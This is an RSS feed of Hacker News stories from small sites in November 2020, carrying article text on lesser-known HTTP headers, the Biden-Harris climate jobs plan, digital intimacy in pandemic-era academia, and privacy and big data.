<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 11 Nov 2020 00:44:56 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 11 Nov 2020 00:44:56 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Four powerful HTTP headers, you did not know before]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25033398">thread link</a>) | @loweisz
<br/>
November 9, 2020 | https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/ | <a href="https://web.archive.org/web/*/https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Almost everything in the web is sent with <strong>http</strong> and even non-developers have seen it when using the internet as keyword
inside urls or links.</p>
<p>Http stands for <strong>Hypertext Transfer Protocol</strong> and gives us the ability to transfer hypertext between a browser and a server.
This is a great technology that has been around almost since the invention of the web and is constantly evolving and
<a href="https://en.wikipedia.org/wiki/HTTP/2">offering more and more great features</a></p>

<p>As a developer you probably heard of http headers, at least in the moment you heard about the CORS policy.
This is a problem you must have heard about when developing websites.
But what exactly are http headers and what other ways are there to use them?</p>
<p>Let us first find out what they do and how you could use them. </p>
<p>When a browser requests a resource, for example a page of this blog, it asks the server with a request.
This request looks something like this: </p>
<div data-language="js"><pre><code><span>fetch</span><span>(</span><span>"https://www.lorenzweiss.de/race_conditions_explained/"</span><span>,</span> <span>{</span>
  credentials<span>:</span> <span>"include"</span><span>,</span>
  headers<span>:</span> <span>{</span>
    accept<span>:</span>
      <span>"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span><span>,</span>
    <span>"accept-language"</span><span>:</span> <span>"en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7"</span><span>,</span>
    <span>"cache-control"</span><span>:</span> <span>"max-age=0"</span><span>,</span>
    <span>"sec-fetch-mode"</span><span>:</span> <span>"navigate"</span><span>,</span>
    <span>"sec-fetch-site"</span><span>:</span> <span>"same-origin"</span><span>,</span>
    <span>"sec-fetch-user"</span><span>:</span> <span>"?1"</span><span>,</span>
    <span>"upgrade-insecure-requests"</span><span>:</span> <span>"1"</span><span>,</span>
  <span>}</span><span>,</span>
  referrerPolicy<span>:</span> <span>"no-referrer-when-downgrade"</span><span>,</span>
  body<span>:</span> <span>null</span><span>,</span>
  method<span>:</span> <span>"GET"</span><span>,</span>
  mode<span>:</span> <span>"cors"</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>So you can see the URL or location of the resource, some information about the request and also a lot of headers with some information about the request.
This is how your browser tells the server some more information about the request. For example what kind of data type it accepts or
how the client is handling the cache.</p>
<p>After sending the request, the server replies, and it also sets some headers in the reply, which could look like this: </p>
<div data-language="text"><pre><code>:authority: www.lorenzweiss.de
:method: GET
:path: /race_conditions_explained/
:scheme: https
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
accept-encoding: gzip, deflate, br
accept-language: en,en-US;q=0.9,de-DE;q=0.8,de;q=0.7
cache-control: max-age=0
cookie: _ga=GA1.2.1173972759.1584812492; _gid=GA1.2.2076192721.1594044231
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36</code></pre></div>
<p>There is also some information that the server wants to tell the browser what to do with the resource, for example
if there are cookies, it must be determined which encoding was used, etc</p>
<p>Basically, in the http-context the headers for the communication of the browser and the server are used to extend the simple
Requests for resources. You could see it as the sheet of paper that is added on top of a package that you oder from an online store,
giving you more information about the context and the resource that you ordered.
Most of the headers have quite good defaults which you don't need to think of, but there are some headers that
can get quite important, like CORS headers. But there are so much more headers that you might never heard of which are very useful
and good to know how to use. </p>

<p>Do not worry, this article will not deal with CORS headers. The following http headers are those that are rarely used, but
can be really powerful and helpful to significantly improve the communication between a server and the browser. </p>
<p>So let's dig into it. Here are some headers that you can set and that are very useful and practical.</p>
<h2 id="if-range"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/If-Range">If-Range</a><a href="#if-range" aria-label="if range permalink"></a></h2>
<h3>What and why?</h3>
<p>Imagine you start downloading a large resource, such as a video, an image, etc., and stop in between because of connection problems.
With <code>If-Range</code> you can tell the server if the representation is unchanged, to send the part(s) that are requested in Range.
Which means only the parts that were missing and not again the whole thing.</p>
<p>This can be very helpful when dealing with large resources and often bad connections as with mobile devices.
Because the resource can be downloaded in parts even if the connection is interrupted in between. </p>
<h4>How to use</h4>
<p>It can either be used with a date when the resources were last modified, or with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag">ETag</a>, which is a key to help if the resources was invalidated</p>
<div data-language="text"><pre><code>If-Range: &lt;day-name&gt;, &lt;day&gt; &lt;month&gt; &lt;year&gt; &lt;hour&gt;:&lt;minute&gt;:&lt;second&gt; GMT
If-Range: &lt;etag&gt;</code></pre></div>
<h4>Example</h4>
<div data-language="text"><pre><code>If-Range: Wed, 21 Oct 2015 07:28:00 GMT </code></pre></div>
<h2 id="vary"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Vary">Vary</a><a href="#vary" aria-label="vary permalink"></a></h2>
<p><code>Vary</code> Comes from a time when the web or http was used for a variety of things and not just for web pages.<br>
It is based on the idea of using http to exchange information in many different formats.
How does it do that? Well, it tells the server in which header to find the information, how to present the information. </p>
<p>Nowadays it can be really helpful if you have different resources for different customers, for example
mobile, tablet or desktop.
Imagine three different images for the same resource are stored on the server, depending on the device.
Then you can simply use the <code>Vary</code> header to tell the server to check the device and then decide which image size to send. </p>
<h4>Example</h4>
<p>For the example with the device dependent images, you can simply pass the 'user agent' to tell the server
that it should check the user-agent for device information. </p>

<h4>How to use</h4>

<p>Just enter the header, the server must check before deciding which resource to send.</p>
<h2 id="content-disposition"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Content-Disposition">Content-Disposition</a><a href="#content-disposition" aria-label="content disposition permalink"></a></h2>
<p>If we go back to the example of a request to a server, for example to load this website, it is clear to the browser,
that it must <strong>display</strong> the resource of the answer.
But it can also be the case that the server sends a resource that the browser should automatically download to the user's computer,
like a picture or pdf etc.
A server can tell the browser what the browser should do with the attached resource via the <code>Content Disposition</code> header.</p>
<h4>Example</h4>
<p>With defining the <code>Content-disposition</code> to <code>attachment</code> the browser knows that this is a resource to download instead of just
show. </p>
<div data-language="text"><pre><code>Content-Disposition: attachment; filename="data.pdf"</code></pre></div>
<h4>How to use</h4>
<p>You can define the header as <code>inline</code> or <code>attachment</code>, where `inline is always the default.  </p>
<div data-language="text"><pre><code>Content-Disposition: &lt;inline | attachment&gt;</code></pre></div>
<h2 id="feature-policy"><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy">Feature-Policy</a><a href="#feature-policy" aria-label="feature policy permalink"></a></h2>
<p>This is a fairly new header and therefore only supported by modern browsers (sorry to all IE users). However
I want to mention this anyway because I think it can be really helpful for some use cases.<br>
Basically, the <code>feature-policy tells the browser which features or apis the browser should provide to the document and its</code>iframes` to be used. </p>
<p>For example, it can ban all scripts or iframes etc. within this website to allow sensitive apis like the camera or microphone.</p>
<h4>How to use</h4>
<div data-language="text"><pre><code>Feature-Policy: &lt;directive&gt; &lt;allowlist&gt;</code></pre></div>
<p>The <code>directive</code> is the name of the feature. You can see the full <a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Feature-Policy#Directives">list of features here</a>
The <code>allowlist</code> defines the origins which are allowed to use the directive.</p>
<h3>Example</h3>
<p>Suppose we want our website to use neither the microphone nor the camera. With this header the
document or a contained iframe cannot access these functions.</p>
<div data-language="text"><pre><code>Feature-Policy: microphone 'none'; camera 'none'</code></pre></div>
<h3>More Headers:</h3>
<p>Here are some more headers that are worth mentioning: </p>
<ul>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Upgrade-Insecure-Requests">Upgrade-Insecure-Requests</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Age">Age</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Trailer">Trailer</a></li>
<li><a href="https://developer.mozilla.org/de/docs/Web/HTTP/Headers/Location">Location</a></li>
</ul>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="conclusion permalink"></a></h2>
<p>Https headers are great and also very useful! But sometimes they can be quite complex, and it's really hard to get an overview of what headers are available and what benefits they bring.
Also when developing a website, especially in the frontend, you don't come in contact with them too often, except maybe with the CORS headers.
But I think that this missed some possibilities. http headers represent the communication between the server and the
customers much better, and we all know that communication is the key to a good relationship.</p>
<p>I hope I could shed some light on the darkness of http headers for you. In case I missed a good and helpful header,
please do not hesitate to send me a mail or contact me in any way.</p></div></div>]]>
            </description>
            <link>https://www.lorenzweiss.de/the_power_of_http_headers_with_four_examples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25033398</guid>
            <pubDate>Mon, 09 Nov 2020 10:44:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The least exploited web browser is IE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25033290">thread link</a>) | @svenfaw
<br/>
November 9, 2020 | https://www.radsix.com/dashboard1/ | <a href="https://web.archive.org/web/*/https://www.radsix.com/dashboard1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.radsix.com/dashboard1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25033290</guid>
            <pubDate>Mon, 09 Nov 2020 10:24:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Biden-Harris plan to create union jobs by tackling the climate crisis]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25033253">thread link</a>) | @_Microft
<br/>
November 9, 2020 | https://buildbackbetter.com/priorities/climate-change/ | <a href="https://web.archive.org/web/*/https://buildbackbetter.com/priorities/climate-change/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	

		<section id="content">

	  
<div data-module="">
  <div>
	<div>
	  <p>From coastal towns to rural farms to urban centers, climate change poses an existential threat — not just to our environment, but to our health, our communities, our national security, and our economic well-being. It also damages our communities with storms that wreak havoc on our towns and cities and our homes and schools. It puts our national security at risk by leading to regional instability that will require U.S military-supported relief activities and could make areas more vulnerable to terrorist activities.</p>
	</div>
  </div>
</div>

<div data-module="" id="climate-change-2" data-new-section="false" data-id="climate-change-2">
  <div>
	<div>
	  <div>
	   <p>The current COVID-19 pandemic reminds us how profoundly the energy and environmental policy decisions of the past have failed communities — allowing systemic shocks, persistent stressors, and pandemics to disproportionately impact communities of color and low-income communities.</p>
<p>At this moment of profound crisis, we have the opportunity to build a more resilient, sustainable economy — one that will put the United States on an irreversible path to achieve net-zero emissions, economy-wide, by no later than 2050. Biden is working to seize that opportunity and, in the process, create millions of good-paying jobs that provide workers with the choice to join a union and bargain collectively with their employers.</p>
<p>President-elect Biden is leading the world to address the climate emergency and leading through the power of example. Biden knows how to stand with America’s allies, stand up to adversaries, and level with any world leader about what must be done. He will not only recommit the United States to the Paris Agreement on climate change – he will go much further than that. He is working to lead an effort to get every major country to ramp up the ambition of their domestic climate targets.</p>
	  </div>
	</div>
  </div>
</div>

<!-- .module.block-quote -->

<div data-module="" id="climate-change-4" data-new-section="false" data-id="climate-change-4">
  <div>
	<div>
	  <div>
	   <p>President-elect Biden will ensure that — coming out of this profound public health and economic crisis, and facing the persistent climate crisis — we are never caught flat-footed again. He is working to launch a national effort aimed at creating the jobs we need to build modern, sustainable infrastructure now and deliver an equitable clean energy future.</p>
<p>The current coronavirus crisis destroyed millions of American jobs, including hundreds of thousands in clean energy. It has exacerbated historic environmental injustices. Biden will immediately invest in engines of sustainable job creation — new industries and re-invigorated regional economies spurred by innovation from our national labs and universities; commercialized into new and better products that can be manufactured and built by American workers; and put together using feedstocks, materials, and parts supplied by small businesses, family farms, and job creators all across our country.</p>
<p>President-elect Biden is working to make far-reaching investments in:</p>
<ul>
<li><strong>Infrastructure:</strong> Create millions of good, union jobs rebuilding America’s crumbling infrastructure – from roads and bridges to green spaces and water systems to electricity grids and universal broadband – to lay a new foundation for sustainable growth, compete in the global economy, withstand the impacts of climate change, and improve public health, including access to clean air and clean water.</li>
<li><strong>Auto Industry:</strong> Create 1 million new jobs in the American auto industry, domestic auto supply chains, and auto infrastructure, from parts to materials to electric vehicle charging stations, positioning American auto workers and manufacturers to win the 21st century; and invest in U.S. auto workers to ensure their jobs are good jobs with a choice to join a union.</li>
<li><strong>Transit:</strong> Provide every American city with 100,000 or more residents with high-quality, zero-emissions public transportation options through flexible federal investments with strong labor protections that create good, union jobs and meet the needs of these cities — ranging from light rail networks to improving existing transit and bus lines to installing infrastructure for pedestrians and bicyclists.</li>
<li><strong>Power Sector:</strong> Move ambitiously to generate clean, American-made electricity to achieve a carbon pollution-free power sector by 2035. This will enable us to meet the existential threat of climate change while creating millions of jobs with a choice to join a union.</li>
<li><strong>Buildings:</strong> Upgrade 4 million buildings and weatherize 2 million homes over 4 years, creating at least 1 million good-paying jobs with a choice to join a union; and also spur the building retrofit and efficient-appliance manufacturing supply chain by funding direct cash rebates and low-cost financing to upgrade and electrify home appliances and install more efficient windows, which will cut residential energy bills.</li>
<li><strong>Housing:</strong> Spur the construction of 1.5 million sustainable homes and housing units.</li>
<li><strong>Innovation:</strong> Drive dramatic cost reductions in critical clean energy technologies, including battery storage, negative emissions technologies, the next generation of building materials, renewable hydrogen, and advanced nuclear – and rapidly commercialize them, ensuring that those new technologies are made in America.</li>
<li><strong>Agriculture and Conservation:</strong> Create jobs in climate-smart agriculture, resilience, and conservation, including 250,000 jobs plugging abandoned oil and natural gas wells and reclaiming abandoned coal, hardrock, and uranium mines — providing good work with a choice to join or continue membership in a union in hardhit communities, including rural communities, reducing leakage of toxics, and preventing local environmental damage.</li>
<li><strong>Environmental Justice:</strong> Ensure that environmental justice is a key consideration in where, how, and with whom we build — creating good, union, middle-class jobs in communities left behind, righting wrongs in communities that bear the brunt of pollution, and lifting up the best ideas from across our great nation — rural, urban, and tribal.</li>
</ul>
	  </div>
	</div>
  </div>
</div>



	</section>

  </article></div>]]>
            </description>
            <link>https://buildbackbetter.com/priorities/climate-change/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25033253</guid>
            <pubDate>Mon, 09 Nov 2020 10:17:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Leaky academia: digital intimacy and open secrets in times of Covid-19]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25033222">thread link</a>) | @tokai
<br/>
November 9, 2020 | https://www.identitiesjournal.com/the-viral-condition-virtual-symposium/leaky-academia-digital-intimacy-and-open-secrets-in-times-of-covid-19 | <a href="https://web.archive.org/web/*/https://www.identitiesjournal.com/the-viral-condition-virtual-symposium/leaky-academia-digital-intimacy-and-open-secrets-in-times-of-covid-19">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><em>Nanna Bonde Thylstrup, <span>Copenhagen Business School, Denmark;</span>&nbsp;Zeerak&nbsp;Waseem, University of Sheffield, UK;&nbsp;and Daniela Agostinho, University of Copenhagen, Denmark</em></p><p><em>Within the context of academia, much like in other sectors of society, the ongoing pandemic has exposed inequalities that we here describe as 'open secrets'. The disclosure of such open secrets, or 'hidden truths' that were never hidden to begin with, is being facilitated through the digitally networked spaces that bring us together more than ever. Engaging with the 'viral condition' foregrounded by this virtual symposium, this essay thinks through how the virality of digital media is currently intersecting with the unfolding viral pandemic. As we find ourselves connecting in new ways, we suggest that it is time to consider the challenges posed by digital networks, the troubled intimacies they generate, and their potential to forge alliances and solidarities amidst stark and growing inequality.&nbsp;</em>&nbsp;</p><div><p>COVID-19 turned the familiar humdrum of the academic year upside down, abruptly putting a stop to everyday routines and demanding new practices. The effects of COVID-19 have been brutal across society: unemployment rates have skyrocketed, economies have gone to shambles, and hundreds of thousands have died and will continue to die and fall ill from this disease.</p><p>&nbsp;Many writers before us have pointed out how the unfolding pandemic has magnified existing inequalities, laying bare realities that were there all along. Such inequalities have also become highly visible in digitally-enabled academia, as higher education institutions have rushed to respond to the spread of the virus.</p><p>&nbsp;Across privileged Scandinavia, from where we write, professors retreated to spacious summerhouses away from urban centres, quietly enjoying their sudden liberation from academic reproductive labour, tedious meetings and departmental obligations. Some even enjoyed a surge in productivity or used their time to catch up on their reading lists. Others seized the chance to add a COVID-19 grant to their already extensive grant collection. Beyond Scandinavia, journal submissions from male authors went up (Flaherty 2020). Executive branches of academia saw new opportunities in the sudden shift to online teaching, framing the analogue-to-digital conversion as a positive disruptive force (Kandri 2020). Tech companies strongly encouraged this embrace and gained new strongholds in the educational sector, fueling disaster capitalism on campus (Turiano 2020). From this perspective, COVID-19 was not only experienced as a social tragedy, but also as an opportunity for retreat, advancement and profit.</p><p>&nbsp;Meanwhile, with their work rhythms, social lives and study habits upended, students struggle to keep afloat in small and shared accommodations. A massive pre-existing mental health crisis among the student population suddenly hits the headlines (Pedersen 2020). Without a systemic response in place, some universities reacted with quickly improvised tips on how to keep a routine and promises of a mindfulness app (Munk 2020), offering technological fixes in lieux of politically-informed responses. Feminist, anti-racist and critical disability communities quickly came together to perform the unpaid and academically unrecognised labour of gathering best practices for online teaching (Davidson 2020; Hamraie 2020; Wernimont 2020). Yet, as student and teacher frustration with online instruction accumulates over time, the already devalued labour performed by critical digital pedagogy is even more frowned upon than before the pandemic. Moreover, the socio-political critiques that underlie this body of scholarship are evacuated by utilitarian uptakes, disregarding the critique of sexism, racism and ableism in academia in favour of uncritical implementation of digital technologies. Meanwhile, the divide between tenured faculty and short-term employees is widening (Zahneiss 2020). Researchers on temporary contracts witness their working hours and job prospects disappear like grains of sand in a precarious hourglass, while universities avoid committing to contract extensions or even use the opportunity to fire temporary employees (Collini 2020). Fieldwork stalls. And journal submissions by women drop (Wiegand et al. 2020; Andersen et al. 2020).</p><p>&nbsp;Within the context of academia, much like in other sectors of society, the ongoing pandemic has exposed inequalities that we here describe as 'open secrets'. The disclosure of such open secrets, or 'hidden truths' that were never hidden to begin with, is being facilitated through the digitally networked spaces that bring us together more than ever. Engaging with the 'viral condition' foregrounded by this virtual symposium, this essay thinks through how the virality of digital media is currently intersecting with the unfolding viral pandemic. As we find ourselves connecting in new ways, we suggest that it is time to consider the challenges posed by digital networks, the troubled intimacies they generate, and their potential to forge alliances and solidarities amidst stark and growing inequality.</p><p>&nbsp;<strong>Leaky conditions – ‘hidden’ truths</strong><br>As we practice containment – stuck in rooms, apartments, buildings, cities and countries – we also experience new modes of intimacy. Through the porous digital networks that bind us, we leak into each others’ homes and lives. We screenshot and close-examine colleagues’ bookshelves and domestic backgrounds. We observe meeting participants who, forgetting they are on screen, fill dishwashers, pick noses or go to the restroom. We leak into rooms and backyards of students while our children, partners, parents and pets photobomb our lectures. We even leak into our own field of vision, our tired faces – normally out of sight – staring back at us on screen.</p><p>&nbsp;These new digital intimacies (Wiehn 2020) are not reserved for close friends and colleagues. We also leak into wider communities and data aggregates through video conferencing platforms, contact tracing apps and new higher-ed platforms. Professors conducting online classes about China in one end of the world leak into Chinese censorship apparatuses through Zoom (@letahong 2020). Researchers developing contact tracing apps in the health sector find themselves entangled in regimes of surveillance and policing (Amnesty 2020). And the rushed adoption of digital technologies in the classroom sediments infrastructures that create new value flows between big tech and higher education (Walsh 2020). Academia’s apparently contained spaces, previously upheld by physical walls and normative epistemological boundaries between the public and private spheres, now turn into intimate membranes that leak through digital networks.</p><p>&nbsp;Digital intimacies have given rise to a string of viral stories about digital transgressions: people unwittingly broadcasting their toilet visits and intimate affairs to department meetings and online classes (Vincent 2020; Smith 2020; Feldman 2020). And in turn, the racialised and sexualised abuse that occurs offline now leak into once safe spaces. Rather than merely exposing flawed privacy settings or digital illiteracy, these stories, in which the boundaries between public and private dissolve, tend to confirm the inherently porous nature of digital technologies. The leakiness of digital technologies is not accidental or anecdotal; it is built into the digital networks that bind us. Rather than premised on sealed infrastructures that shield and protect, digital technologies are meant to leak at all times (Agostinho and Thylstrup 2019; Chun 2016). Crucially, this leaky nature not only exposes domestic intimacies to the wider world; it also enables and upholds the economic model of surveillance capitalism, as it allows for massive and continuous data flows across platforms.</p><p>&nbsp;Exhausted by lockdowns and fatigued by digital screens, many of us long to return to more contained spaces: meeting rooms, classrooms, hallways and canteens that will allow us to maintain the (imagined) boundaries between public and private and navigate safe and unsafe spaces physically. But this longing for contained spaces also reveals a conservative nostalgia for spaces where privilege can thrive without being confronted by precarity and vulnerability. A space where the pre-existing inequalities are less dramatically seen and felt. Where academia’s dirty secrets can be thrown back into the closet.</p><p>&nbsp;Here we draw on queer theorist Eve Sedgwick and her landmark book <em>Epistemology of the Closet</em> (1990), where she challenges the binary ‘secrecy/disclosure’ that forms the backbone of modern society. Following Michel Foucault, Sedgwick examines sexuality (its secrecy and disclosure) as the structure of modern ways of knowing. She suggests that modern power is premised on the knowledge and withholding of secrets, or as she puts it, modern power is organized around the figure of the closet. The closet here functions as a contained space: what it contains (what is closeted) and what it spills or leaks (the act of outing) structures the modern organisation of knowledge, what is supposed to be known and what is supposed to remain unknown. As Claire Hemmings puts it, the 'closet is the open secret through which difference and inequality are both obscured and played out in front of our eyes in plain sight' (Hemmings 2020).</p><p>&nbsp;The closet of society’s open secrets has been further challenged by the intersection of the pandemic with digital connectivity. Within academia, the shared (if unequally felt) condition of COVID-19 and the unprecedented intimacy of digital media laid bare the 'hidden' truths of academic inequality, both locally and globally. We use scare quotes around 'hidden' to emphasise how these inequalities were never actually <em>hidden</em>. Instead they were hiding in plain sight, but only the privileged could afford to look away: the unequal distribution of reproductive labour, falling along gendered and racialised lines; the previous exclusion …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.identitiesjournal.com/the-viral-condition-virtual-symposium/leaky-academia-digital-intimacy-and-open-secrets-in-times-of-covid-19">https://www.identitiesjournal.com/the-viral-condition-virtual-symposium/leaky-academia-digital-intimacy-and-open-secrets-in-times-of-covid-19</a></em></p>]]>
            </description>
            <link>https://www.identitiesjournal.com/the-viral-condition-virtual-symposium/leaky-academia-digital-intimacy-and-open-secrets-in-times-of-covid-19</link>
            <guid isPermaLink="false">hacker-news-small-sites-25033222</guid>
            <pubDate>Mon, 09 Nov 2020 10:10:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Think Piece on Privacy and Big Data]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25033030">thread link</a>) | @Rohitha_Perera
<br/>
November 9, 2020 | https://talk.hyvor.com/blog/privacy-and-big-data/ | <a href="https://web.archive.org/web/*/https://talk.hyvor.com/blog/privacy-and-big-data/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span></span>
<span>114</span>
</p>
<p>The majority of us in the present and in the immediate future <a href="https://www.beyondtrust.com/blog/entry/exactis-data-breach-paving-road-data-dystopia-us-gdpr">will face the issue of Privacy</a>. Consider this basic thought, which may sound like science fiction, but is actually quite present today: Thanks to the devices we wear now, <a href="https://www.beyondtrust.com/blog/entry/exactis-data-breach-paving-road-data-dystopia-us-gdpr">the harvesting of our biometric data</a> is a possibility. It is this thought process that led to this think piece on privacy and big data.</p>
<p>Corporations can get to know us far better than we know ourselves. They can then not just predict our feelings but also manipulate our feelings. Monitoring of our biometrics can make episodes like that of Cambridge Analytica’s data hacks prehistoric in comparison. </p>
<p>Remember that <a href="https://www.cheatsheet.com/money-career/heres-much-google-facebook-really-think-youre-worth.html/">you are worth quite a bit of money to the social channels </a>you use. The podcast detailing the <a href="https://podcasts.google.com/?feed=aHR0cHM6Ly9mZWVkcy5zaW1wbGVjYXN0LmNvbS9IY09mTE41Mg&amp;ep=14&amp;episode=MjM0YjM1OTgtZTQ1Mi00NGZhLTkzYjUtMTQxMGJjZTY1NGE4">Congressional Antitrust Investigation on Tech Monopolies: Google, Facebook, Amazon, and Apple</a> gives a serious look at how powerful these big data companies are. The scale is astronomical. Amazon captures 70% of all retails in the United States. They literally have seven times the revenue of their next largest competitor. </p>
<p>Now imagine their cloud computing capabilities. Take stock of the number of iPhones that are there. We know that what you share on social media, and the information that you surrender is a Big Data Issue; and, consider the number of search results Google controls. There’s information about you being harvested. You should know how your information is being used. </p>
<h2>Some Background</h2>
<p>We hear of how <a href="https://www.theguardian.com/us-news/2018/mar/22/steve-bannon-on-cambridge-analytica-facebook-data-is-for-sale-all-over-the-world">Steve Bannon used Facebook</a> to change politics and change culture. Facebook data, algorithms and narratives were his key weapons. These tools were used by the <a href="https://www.reuters.com/article/us-facebook-cambridge-analytica-kogan-idUSKBN1GX2F6">Cambridge Analytica team to identify the dark triad</a> — Narcissism, Machiavellianism and Psychopathy — in people. We now know about the Russian interference in American politics. We know how data had been manipulated to channel the latent proclivities of racism and anti-Semitism within America to divide it. </p>
<p>The same podcast makes mention of a great knowledge-infused book, which is Shoshana Zuboff’s <a href="https://youtu.be/QL4bz3QXWEo">The Age of Surveillance Capitalism</a>. In this book, Zuboff details the rise of a new form of power which will forever change our lives. By collecting behavioral data from their users, corporations have amassed an incomprehensibly large and detailed picture of our personal lives. They use this data to expand their corporate power and profitability. This, of course, has tremendous consequences for our privacy, but also for our political system.</p>
<figure><img src="https://talk.hyvor.com/blog/wp-content/uploads/2020/10/big-5-personality.jpg" alt="" data-src="https://talk.hyvor.com/blog/wp-content/uploads/2020/10/big-5-personality.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>Surveillance Capitalism talks of <a href="https://www.simplypsychology.org/big-five-personality.html">The Five Factor Personality Test</a>, which helps companies like Facebook infer our political proclivities and sexuality. This is based on the predictive signals based on the punctuation we use on a Facebook status. </figcaption></figure>
<p>Surveillance Capitalism is where it universally claims our private human experience as their free source of raw material. They take the rich predictive signals in our behavior and convert it into data. We hear of <a href="https://arstechnica.com/information-technology/2017/05/facebook-helped-advertisers-target-teens-who-feel-worthless/#:~:text=Leaked%202017%20document%20reveals%20FB,exploit%20teens'%20words%2C%20images.&amp;text=Facebook's%20secretive%20advertising%20practices%20became,of%20the%20company's%20Australian%20office.">Facebook executives who promote&nbsp;advertising campaigns that exploit Facebook users’ emotional states</a>. Facebook’s algorithms can determine, and&nbsp;allow&nbsp;advertisers to pinpoint, “moments when young people need a confidence boost.”&nbsp;97% of Facebook’s revenue comes from its online targeted advertising markets. These are wholly-owned and operated in this surveillance capitalist economic logic. </p>
<p>Readers of Cathy O’Neil’s Weapons of Math Destruction will be compelled to believe the potential dangers of big data. O’Neil, a mathematician, analyses how the use of big data and algorithms in a variety of fields. These include insurance, advertising, education, and policing. They can lead to decisions that harm the poor, reinforce racism, and amplify inequality. Mathematicians and statisticians were for a very long time studying our desires, movements, and spending power. This is the Big Data economy we are living in. </p>
<h2>Trust is Important </h2>
<p>Consumers are more conscious of their data privacy than ever. A recent <a href="https://tealium.com/resource/whitepaper/how-brands-can-prioritize-privacy-in-the-age-of-data/">Tealium study</a> on consumer data privacy found that 97% of consumers surveyed said they are somewhat or very concerned about protecting their data. <a href="https://www.accenture.com/t20171220T024439Z__w__/us-en/_acnmedia/PDF-68/Accenture-Global-Anthem-POV.pdf#zoom=50">Research by Accenture</a>&nbsp;shows that&nbsp;88% of<strong> </strong>consumers say companies that provide personalized experiences without compromising their trust are more appealing and can relate to their needs better than others.</p>
<p>We are focusing on Facebook on this particular blog post to quite a degree since it is the one singular social medium that is growing exponentially. One of the ways in which Facebook garners your data is with you revealing your data and your intentions via the act of publishing status updates and even commenting. You see, the act of commenting fulfills just one touchpoint in the process of these tech giants harvesting of data. Facebook built&nbsp;<a rel="noreferrer noopener" href="https://developers.facebook.com/docs/plugins/comments/" target="_blank">comments plugin</a>&nbsp;to allow users to leave comments on websites, blogs and forums through their Facebook accounts. It was expected to provide high-quality conversations over the internet but instead ended up spamming popular sites.</p>
<p>If you do use the Facebook Comments plugin, remember that your comments are a valuable content asset that shouldn’t be subject to <a href="https://ducttapemarketing.com/how-and-why-i-use-the-facebook-comments-plugin/">Facebook’s Terms of Service</a>, which basically says they can do whatever they want with them. An increasing amount of spam raises questions about how well the policy of malicious content online is going on. There are many misleading and offensive comments, usually attracting and persuading users towards a specific link to click it. These comments are often repetitive and can easily be identified as spam.</p>
